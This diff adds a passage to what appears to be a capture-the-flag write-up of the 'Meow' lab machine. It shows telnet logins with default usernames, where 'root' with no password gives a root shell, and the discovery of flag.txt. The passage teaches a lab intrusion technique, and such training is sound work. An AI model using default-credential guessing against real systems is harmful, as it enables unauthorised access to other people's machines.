@@ -95,6 +95,66 @@ Escape character is '^]'.
 Meow login: 
 ```
 
+Now we can try to use some commonly used credentials that may have been set up insecurely by that admin who set up the service. Some common login user names default to admin/admin or root/root. We can start by using these credntials to start with.
 
+```
+Meow login: admin
+Password: 
+
+Login incorrect
+```
+
+```
+Meow login: root
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 16 Jul 2022 02:20:12 PM UTC
+
+  System load:           0.0
+  Usage of /:            41.7% of 7.75GB
+  Memory usage:          4%
+  Swap usage:            0%
+  Processes:             139
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.1.17
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:e2d7
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+75 updates can be applied immediately.
+31 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
+root@Meow:~# 
+```
+We can see here by using the username root, we were able to get root access to the system. 
+
+Once infiltrated, we can now scan the directory for any important files.
+
+```
+root@Meow:~# ls
+
+flag.txt  snap 
+```
+
+As we can see, we found out first flag in the main directory.
+
+## Conclusions - Level 1 Meow
+
+Using nmap, we were able to discover the host was running telnet on port 23. From there, we were able to get root access to service since the administrator of server had poorly configured the authentication of the system.
+
+ 
 
 
